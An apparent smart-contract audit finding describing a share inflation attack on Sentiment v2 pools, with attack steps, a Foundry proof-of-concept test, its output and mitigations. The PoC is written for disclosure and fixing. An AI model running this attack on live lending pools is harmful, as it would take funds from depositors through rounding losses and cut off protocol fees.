Joyous Cream Coyote

High

# Share inflation on base pools can cause heavy losses to users

### Summary

Users can deposit and borrow from pools in Sentiment v2 which calculates each user's balance through an Asset and Share system. By it's nature, Assets are supposed to always grow (in case there are no bad debts), and therefore are larger in value than shares. However, malicious users can heavily inflate each share, and can cause miscalculations due to rounding errors. This would effect pools with less underlying decimal asset in a way that 1- The fee paid to the pool can br bricked easily 2- the users that deposit can lose money due to loss of precision.

### Root Cause

- In [`Pool:381`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L381-L383), and [`FixedRateModel.sol:33`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/irm/FixedRateModel.sol#L33) the accrual is always rounded up.
- In the documentation, it is said that `Min Debt = from 0 to 0.05 ETH = from 0 to 50000000000000000`. While this attack is possible for all `minDebts` in this range, we will consider that `Min Debt = 0` to explore the most extreme case. Consider that by increasing the amount of `MinDebt` this attack would be much less feasible.
- In [`Pool.sol`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L381), the value `interestAccrued` is in base asset's decimals, which means for USDC/USDT, this amount would be only 6 decimals. This makes the share inflation attack way more feasible on such low decimal tokens.

### Internal pre-conditions

N/A

### External pre-conditions

1- since the inflation happens through accruals in each block, the attacker should not be interrupted during the process. In case of interruptions, attacker can start to work on a new pool.

### Attack Path

The goal of the Attacker is to inflate each share and map each 1 share to a much higher amount of Asset.
Here, we consider that the attacker is not going to be interrupted during the process, and also consider `minDebt == 0`.
1- The attacker deposits 1 asset into the protocol, bringing `totalDepositAssets` and `totalDepositShares` both to 1.
2- The attacker borrows the 1 asset from the protocol, bringing `totalBorrowAssets` and `totalBorrowShares` both to 1, also setting the utilization to 100 percent.
3- attacker starts accruing with each block, after the first accrual, [`Pool:407`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L407-L409) adds to the Assets, inflating them in the process. `feeShares` is usually zero due to rounding down and small amounts in the process.
4- After the first accrual, `totalDepositAssets` and `totalBorrowAssets` are set to 2, while the shares remain in the previous value.
5- Attacker can continue and do this for a day, after `(24*3600)/12 = 7200 times`, can bring asset/share to `7201`.
6- After the second day and `14400` times of accrual, bringing asset/share ratio to `14400`. (Attacker can get achieve bigger numbers if they continue doing this)
7- At this point, every deposit or borrow from users would be rounded down/up by 14400. A victim can deposit `14400 * 2 - 1` assets and would only receive 1 share, basically sharing `14400 - 1` with the rest of the pool. 
8 - This would especially effect the pools with less decimal values such as `USDC` and `USDT`.

### Impact

- Fees to the protocol will shutdown after a certain ratio is reached. Since [`interestAccrued`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L381-L383) is small each time and protocol [fees are rounded down twice](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L387-L395), protocol lenders can use such tricks and accrue frequently to avoid paying any fees to the protocol owner.
- The share inflation can cause loss of funds to both lenders and borrowers, and a malicious user with correct inputs that do not lose value due to precision loss can steal funds from other people in such systems.
- The internal bookkeeping of the protocol would be incorrect.

### PoC

The output of the test is:
```text
  ================
  One day of constant accrual
  Total Borrow Assets:  7201
  Total Borrow Shares:  1
  Total Deposit Assets:  7201
  Total Deposit Shares:  1
  ================
  Two days of constant accrual
  Total Borrow Assets:  14401
  Total Borrow Shares:  1
  Total Deposit Assets:  14401
  Total Deposit Shares:  1
  ================
  Total Borrow Assets:  14401
  Total Borrow Shares:  1
  Total Deposit Assets:  43202
  Total Deposit Shares:  2
  ================
```
PoC:
```solidity
   function testInflateShares() public {
        address attacker = makeAddr("Attacker");
        address victim = makeAddr("Victim");
        address liquidator = makeAddr("Liquidator");

        vm.startPrank(protocolOwner);
        riskEngine.setOracle(address(asset1), address(asset3Oracle)); // 1:1 with Eth
        riskEngine.setOracle(address(asset2), address(asset3Oracle)); // 1:1 with Eth
        vm.stopPrank();

        MockERC20 borrowAsset = asset1; 
        MockERC20 collateralAsset = asset2;
        uint256 amountOfAsset = 1_000 ether;
        uint256 vicPoolId;
        address attPosition;
        bytes memory data;
        Action memory action;

        /**
        * =============================
        *           SETUP
        * =============================
         */
        {
            // == Minting assets to actors
            borrowAsset.mint(attacker, amountOfAsset);
            collateralAsset.mint(attacker, amountOfAsset);

            borrowAsset.mint(victim, amountOfAsset);
            collateralAsset.mint(victim, amountOfAsset);

            borrowAsset.mint(liquidator, amountOfAsset);
            // == Finish minting assets

            // == Making the position
            vm.startPrank(attacker);
            bytes32 salt = bytes32(uint256(98));
            address owner = attacker;
            data = abi.encodePacked(owner, salt);
            (attPosition,) = protocol.portfolioLens().predictAddress(owner, salt);
            action = Action({ op: Operation.NewPosition, data: data });
            positionManager.process(attPosition, action);
            vm.stopPrank();

            vm.startPrank(positionManager.owner());
            positionManager.toggleKnownAsset(address(borrowAsset));
            // positionManager.toggleKnownAsset(address(collateralAsset)); // Already a known asset
            vm.stopPrank();
            // == Finish making the position

            // == victim making the pool
            // // ==== Setting the rateModel
            address rateModel = address(new LinearRateModel(1e18, 2e18));
            bytes32 RATE_MODEL_KEY = 0xc6e8fa81936202e651519e9ac3074fa4a42c65daad3fded162373ba224d6ea96;
            vm.prank(protocolOwner);
            registry.setRateModel(RATE_MODEL_KEY, rateModel);
            // // ==== Finished Setting the rate model
            vm.startPrank(victim);
            vicPoolId = pool.initializePool(
                victim, // owner
                address(borrowAsset), // asset to use
                1e30, // pool cap
                RATE_MODEL_KEY // rate model key in registry
                );
            // // ==== Setting the LTV
            riskEngine.requestLtvUpdate(vicPoolId, address(collateralAsset), 0.95e18); // Using the same asset to borrow one in this case
            riskEngine.acceptLtvUpdate(vicPoolId, address(collateralAsset));
            // // ==== Finish setting the LTv
            vm.stopPrank();
            // == Finished making the pool

            // == Attacker setting up the position
            vm.startPrank(attacker);
            data = abi.encodePacked(address(collateralAsset));
            action = Action({ op: Operation.AddToken, data: data });
            positionManager.process(
                attPosition,
                action
            );
            collateralAsset.transfer(address(attPosition), amountOfAsset/2);
            vm.stopPrank();
            // == Finish Attacker setting up the position
        }

        /**
        * =============================
        *           EXPLOIT
        * =============================
         */

        logPoolData(vicPoolId, attPosition);

        vm.startPrank(attacker);
        borrowAsset.approve(address(pool), amountOfAsset/5);
        pool.deposit(vicPoolId, 1, attacker);
        vm.stopPrank();

        logPoolData(vicPoolId, attPosition);

        vm.startPrank(attacker);
        data = abi.encodePacked(vicPoolId, uint256(1));
        action = Action({ op: Operation.Borrow, data: data });
        positionManager.process(
            attPosition,
            action
        );
        borrowAsset.transfer(attPosition, amountOfAsset/50);
        vm.stopPrank();

        logPool(vicPoolId);
        for(uint i = 1; i <= 7200; i++){
            vm.warp(block.timestamp + 12);
            pool.accrue(vicPoolId);
        }
        console2.log("One day of constant accrual");
        logPool(vicPoolId);

        for(uint i = 1; i <= 7200; i++){
            vm.warp(block.timestamp + 12);
            pool.accrue(vicPoolId);
        }
        console2.log("Two days of constant accrual");
        logPool(vicPoolId);

        (,,,,,,,,, uint256 tDAssets,) = pool.poolDataFor(vicPoolId);
        vm.startPrank(victim);
        borrowAsset.approve(address(pool), type(uint256).max);
        collateralAsset.approve(address(pool), type(uint256).max);
        pool.deposit(vicPoolId, tDAssets * 2 - 1, victim);
        vm.stopPrank();

        logPool(vicPoolId);
    }

    function logPool(uint256 poolId) view public {
        (,,,,,,,uint256 tBAssets, uint256 tBShares, uint256 tDAssets, uint256 tDShares) = pool.poolDataFor(poolId);
        console2.log("Total Borrow Assets: ", tBAssets);
        console2.log("Total Borrow Shares: ", tBShares);
        console2.log("Total Deposit Assets: ", tDAssets);
        console2.log("Total Deposit Shares: ", tDShares);
        console2.log("================");
    } 
```

### Mitigation

- Increase the amount of `minDebt` to at least 0.05 ETH. Explore how the feasibility of this attack drops with the increase of `minDebt`.
- the `interestAccrued` should be normalized to the 18 decimals even for lower asset decimals, this makes the calculations for such assets much more accurate.